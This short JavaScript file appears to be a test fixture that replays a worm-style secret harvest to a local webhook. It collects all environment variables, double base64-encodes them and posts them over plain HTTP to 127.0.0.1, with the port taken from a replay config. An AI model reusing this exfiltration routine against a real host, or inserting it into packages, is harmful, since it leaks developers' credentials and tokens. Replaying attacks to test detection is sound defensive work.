// The same harvest as shai_hulud.mjs, posted to a plain HTTP webhook.
import { readFileSync } from "node:fs";
import { request } from "node:http";
const cfg = JSON.parse(readFileSync("replay.json"));
const data = Buffer.from(Buffer.from(JSON.stringify({ environment: process.env })).toString("base64")).toString("base64");
await new Promise((done) => {
  const req = request({ host: "127.0.0.1", port: cfg.ports.plain, method: "POST", path: "/hook" }, (res) => {
    res.resume();
    res.on("end", () => { console.log("exfil sent"); done(); });
  });
  req.on("error", (e) => { console.log("exfil refused", e.code); done(); });
  req.end(data);
});
